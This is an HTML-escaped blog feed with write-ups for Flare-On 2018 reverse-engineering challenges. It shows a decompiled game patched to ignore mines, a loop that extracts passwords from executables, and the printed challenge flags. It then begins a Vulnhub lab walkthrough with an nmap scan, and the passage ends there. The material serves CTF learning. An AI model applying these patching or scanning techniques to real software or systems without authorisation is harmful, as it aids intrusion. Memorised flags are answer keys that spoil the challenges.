&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;JOptionPane&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;showInputDialog&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Enter your invitation code:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Minesweeper Championship 2018&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;GoldenTicket2018@flare-on.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;JOptionPane&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;showMessageDialog&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Welcome to the Minesweeper Championship 2018!\nPlease enter the following code to the ctfd.flare-on.com website to compete:\n\n&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Success!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;JOptionPane&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;showMessageDialog&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Incorrect invitation code. Please try again next year.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failure&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We directly got the challenge flag &lt;code&gt;GoldenTicket2018@flare-on.com&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id="ultimate-minesweeper"&gt;Ultimate Minesweeper&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;You hacked your way into the Minesweeper Championship, good job. Now its time to
compete. Here is the Ultimate Minesweeper binary. Beat it, win the championship,
and we'll move you on to greater challenges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="/media/2018.10/flare/UltimateMinesweeper.7z"&gt;Download the challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Once unzip the file is a 32bits executable binary.
    $ file UltimateMinesweeper.exe
    UltimateMinesweeper.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows&lt;/p&gt;
&lt;p&gt;When executed the program is similar to every Minesweeper execpt there is a LOT
of mines! Only 3 squares of the 900 are not mines. The goal is to reveal this 3
squares with exploding on a mine.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture4.PNG" src="/media/2018.10/Capture4.PNG"&gt;&lt;/p&gt;
&lt;p&gt;We can use a tool like &lt;a href="https://github.com/0xd4d/dnSpy"&gt;DnSpy&lt;/a&gt; to decompile the
.NET and access the source code.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture5.PNG" src="/media/2018.10/Capture5.PNG"&gt;&lt;/p&gt;
&lt;p&gt;We can even recompile the code. Nevertheless , the line 156 will fire a
compilation error. In order to fix it, we need to convert the value to byte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;array3[(int)num2] = (byte)(array3[(int)num2] ^ array[(int)num]);&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can for instance disable the failure when revealing a mine by changing the
code of the &lt;code&gt;BombRevealed&lt;/code&gt; function and make it always return &lt;code&gt;false&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;public&lt;/span&gt; &lt;span class="nv"&gt;bool&lt;/span&gt; &lt;span class="nv"&gt;BombRevealed&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="nv"&gt;get&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  {&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;num&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;num&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)((&lt;/span&gt;&lt;span class="nv"&gt;ulong&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;Size&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    {&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;num2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="ss"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;num2&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;long&lt;/span&gt;&lt;span class="ss"&gt;)((&lt;/span&gt;&lt;span class="nv"&gt;ulong&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;Size&lt;/span&gt;&lt;span class="ss"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      {&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;MinesPresent&lt;/span&gt;[&lt;span class="nv"&gt;num2&lt;/span&gt;, &lt;span class="nv"&gt;num&lt;/span&gt;] &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;this&lt;/span&gt;.&lt;span class="nv"&gt;MinesVisible&lt;/span&gt;[&lt;span class="nv"&gt;num2&lt;/span&gt;, &lt;span class="nv"&gt;num&lt;/span&gt;]&lt;span class="ss"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        {&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        }&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nv"&gt;num2&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      }&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="nv"&gt;num&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    }&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  }&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we can clic on every square and get the Success message.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture2.PNG" src="/media/2018.10/Capture2.PNG"&gt;&lt;/p&gt;
&lt;p&gt;The flag seems to be encoded. When looking at the function &lt;code&gt;GetKey&lt;/code&gt; we see that
the &lt;code&gt;Random&lt;/code&gt; is build using a seed depending of the revealed cells.&lt;/p&gt;
&lt;p&gt;We then discover that the mines (and more importently the 3 empty squares) are
always at the same place. So we can just found the position of every empty
squares with our modified binary.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture.PNG" src="/media/2018.10/Capture.PNG"&gt;&lt;/p&gt;
&lt;p&gt;And then just reveal this three squares in order to get the Success message with
the flag.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture3.PNG" src="/media/2018.10/Capture3.PNG"&gt;&lt;/p&gt;
&lt;h2 id="fleggo"&gt;FLEGGO&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;When you are finished with your media interviews and talk show appearances after
that crushing victory at the Minesweeper Championship, I have another task for
you. Nothing too serious, as you'll see, this one is child's play.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="/media/2018.10/flare/FLEGGO.7z"&gt;Download the challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Once extraxted we get 48 executables. Each binary is a 32bits executable.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ file ./*&lt;/span&gt;
&lt;span class="code-line"&gt;./1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe: PE32 executable &lt;span class="o"&gt;(&lt;/span&gt;console&lt;span class="o"&gt;)&lt;/span&gt; Intel &lt;span class="m"&gt;80386&lt;/span&gt;, &lt;span class="k"&gt;for&lt;/span&gt; MS Window&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When launching any of the executable we get an error about the VCRUNTIME140 DLL
missing.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture6.PNG" src="/media/2018.10/Capture6.PNG"&gt;&lt;/p&gt;
&lt;p&gt;To fix this you just need to install Visual Studio Community Edition.&lt;/p&gt;
&lt;p&gt;After a few try using IDA and OllyDBG, I found a hint on &lt;a href="https://twitter.com/ixSly/status/1034842534957203456"&gt;twitter&lt;/a&gt;:
&lt;img alt="Capture7.PNG" src="/media/2018.10/Capture7.PNG"&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;FLOSS static UTF-16 strings&lt;/span&gt;
&lt;span class="code-line"&gt;@BRICK&lt;/span&gt;
&lt;span class="code-line"&gt;%s\%s&lt;/span&gt;
&lt;span class="code-line"&gt;IronManSucks&lt;/span&gt;
&lt;span class="code-line"&gt;Oh, hello Batman...&lt;/span&gt;
&lt;span class="code-line"&gt;I super hate you right now.&lt;/span&gt;
&lt;span class="code-line"&gt;What is the password?&lt;/span&gt;
&lt;span class="code-line"&gt;%15ls&lt;/span&gt;
&lt;span class="code-line"&gt;Go step on a brick!&lt;/span&gt;
&lt;span class="code-line"&gt;Oh look a rainbow.&lt;/span&gt;
&lt;span class="code-line"&gt;Everything is awesome!&lt;/span&gt;
&lt;span class="code-line"&gt;%s =&amp;gt; %s&lt;/span&gt;
&lt;span class="code-line"&gt;BRICK&lt;/span&gt;
&lt;span class="code-line"&gt;ZImIT7DyCMOeF6&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;FLOSS decoded 0 strings&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;FLOSS extracted 0 stackstrings&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Finished execution after 2.266808 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The binary password is given just after the &lt;code&gt;BRICK&lt;/code&gt; string.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@kalili&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="k"&gt;work&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fleggo&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;wine&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;000&lt;/span&gt;&lt;span class="nl"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;err&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;service&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;process_send_command&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;receiving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;result&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;timed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;out&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;What&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="vm"&gt;?&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ZImIT7DyCMOeF6&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Everything&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;awesome&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mf"&gt;65141174.&lt;/span&gt;&lt;span class="n"&gt;png&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;An image is created associated to a character.&lt;/p&gt;
&lt;p&gt;We can automatized this for the 48 binary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~/work/fleggo# for f in *exe; do wine $f &amp;lt;&amp;lt;&amp;lt; `./floss $f | grep &amp;#39;^BRICK&amp;#39; -A 1 | grep -v BRICK` ; done&lt;/span&gt;
&lt;span class="code-line"&gt;000f:err:service:process_send_command receiving command result timed out&lt;/span&gt;
&lt;span class="code-line"&gt;What is the password?&lt;/span&gt;
&lt;span class="code-line"&gt;Everything is awesome!&lt;/span&gt;
&lt;span class="code-line"&gt;65141174.png =&amp;gt; w&lt;/span&gt;
&lt;span class="code-line"&gt;000f:err:service:process_send_command receiving command result timed out&lt;/span&gt;
&lt;span class="code-line"&gt;What is the password?&lt;/span&gt;
&lt;span class="code-line"&gt;Everything is awesome!&lt;/span&gt;
&lt;span class="code-line"&gt;85934406.png =&amp;gt; m&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A simple redirection allow to keep the information in a file.
In the corner of each image is the position of the associated charactere.
(for instance the image 85934406.png is associated to the letter "m" and the
number in the right corner is 35 so the "m" is in the 35th position).&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture8.PNG" src="/media/2018.10/Capture8.PNG"&gt;&lt;/p&gt;
&lt;p&gt;We might use tesseract in order to automaticaly detect the number in the corner.
But I manualy identify them and got the order of the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;mor3_awes0m3_th4n_an_awes0me_p0ssum&lt;/span&gt;&lt;span class="nv"&gt;@flare&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="binstall"&gt;binstall&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;It is time to get serious. Reverse Engineering isn't about toys and games.
Sometimes its about malicious software. I recommend you run this next
challenge in a VM or someone else's computer you have gained access to,
especially if they are a Firefox user.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="/media/2018.10/flare/binstall.7z"&gt;Download the challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Once unzip we get a simple executable.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;binstall&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Downloads&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;binstall&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;binstall&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PE32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;executable&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Intel&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;80386&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mono&lt;/span&gt;&lt;span class="o"&gt;/.&lt;/span&gt;&lt;span class="n"&gt;Net&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;assembly&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As said in the descritpion this file is a malware and a lot of AV detect it as
someone uploaded it on &lt;a href="https://www.virustotal.com/#/file/1284211e57621f84118ce28a4df024163f663c6891c9f154883df804b592ee08/detection"&gt;virus
total&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture9.PNG" src="/media/2018.10/Capture9.PNG"&gt;&lt;/p&gt;
&lt;p&gt;I didn't get a lot of time to work on this challenge and didn't solve it.&lt;/p&gt;
&lt;h1 id="contest-ending"&gt;Contest ending&lt;/h1&gt;
&lt;p&gt;The contest is now over and fireEye realse the &lt;a href="https://www.fireeye.com/blog/threat-research/2018/10/2018-flare-on-challenge-solutions.html"&gt;solution for all challenges&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="reverse"></category></entry><entry><title>Vulnhub, born2root</title><link href="https://maggick.fr/2017/11/vulnhub-born2root.html" rel="alternate"></link><published>2017-11-20T16:00:00+01:00</published><updated>2017-11-20T16:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2017-11-20:/2017/11/vulnhub-born2root.html</id><summary type="html">&lt;p&gt;&lt;img alt="Born2root homepage" class="align-left" src="/media/2017.11/born2root/1.png" width="162"/&gt;&lt;/p&gt;
&lt;p&gt;After the bulldog machine I worked on the &lt;a href="https://www.vulnhub.com/entry/born2root-1,197/"&gt;born2root&lt;/a&gt; one.
A simple boot2root machine by &lt;a href="https://twitter.com/h4d3sw0rm"&gt;Hadi Mene&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2017.11/born2root/1.png" alt="Born2root homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;After the bulldog machine I worked on the &lt;a href="https://www.vulnhub.com/entry/born2root-1,197/"&gt;born2root&lt;/a&gt; one.
A simple boot2root machine by &lt;a href="https://twitter.com/h4d3sw0rm"&gt;Hadi Mene&lt;/a&gt;.&lt;/p&gt;


&lt;h2 id="discovery"&gt;Discovery&lt;/h2&gt;
&lt;p&gt;First we scan all port of the VM:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# nmap -sSV 10.0.2.5&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-14 15:43 CET&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.0.2.5&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.00036s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 997 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT    STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp  open  http    Apache httpd 2.4.10 ((Debian))&lt;/span&gt;
&lt;span class="code-line"&gt;111/tcp open  rpcbind 2-4 (RPC #100000)&lt;/span&gt;
&lt;span class="code-line"&gt;MAC Address: 08:00:27:84:43:C4 (Oracle VirtualBox virtual NIC)&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So we got a SSH service on port 22 and a web service on the port 80.
Let's see what the website propose:&lt;/p&gt;
&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website simulate a company selling security services:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Landing page" src="/media/2017.11/born2root/1.png"&gt;&lt;/p&gt;
&lt;p&gt;The robots.txt file contain 2 url:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;User-agent: *&lt;/span&gt;
&lt;span class="code-line"&gt;Disallow: /wordpress-blog&lt;/span&gt;
&lt;span class="code-line"&gt;Disallow: /files&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code&gt;/wordpress-blog&lt;/code&gt; lead us to a simple image:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Troll" src="/media/2017.11/born2root/2.png"&gt;&lt;/p&gt;
&lt;p&gt;The /files give us an empty directory listing:&lt;/p&gt;
